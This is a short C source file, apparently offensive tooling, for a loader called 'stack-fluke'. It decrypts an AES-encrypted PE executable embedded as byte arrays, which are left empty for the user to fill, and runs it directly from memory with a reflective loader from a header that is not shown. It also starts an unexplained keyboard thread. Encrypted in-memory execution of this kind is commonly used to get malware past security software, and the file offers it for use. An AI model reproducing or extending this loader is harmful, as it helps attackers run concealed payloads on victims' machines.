/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

    gcc -o stack-fluke stack-fluke.c -s -ldbghelp

    [!] DO NOT use optimisation.

*/

#include "include\FixPE.h"

int main() {
    // Replace this with your actual PE file hex bytes
    BYTE peFileBytes[] = { };
    BYTE key[] = { };

    DecAES(peFileBytes, sizeof(peFileBytes), key, sizeof(key));
    PBYTE fileBuffer = peFileBytes;

    PEHeaders peHeaders = { 0 };
    if (!InitializePEHeaders(&peHeaders, fileBuffer)) {
        fprintf(stderr, "Failed to initialize PE headers.\n");
        return -1;
    }

    HANDLE hThread;
    if(!CreateThread(NULL, 0, KeyboardThread, NULL, 0, NULL)){
        PRINT_WINAPI_ERR("CreateThread");
        return -1;
    }

    if (!ExecutePE(&peHeaders)) {
        fprintf(stderr, "Failed to execute PE file.\n");
        return -1;
    }

    return 0;
}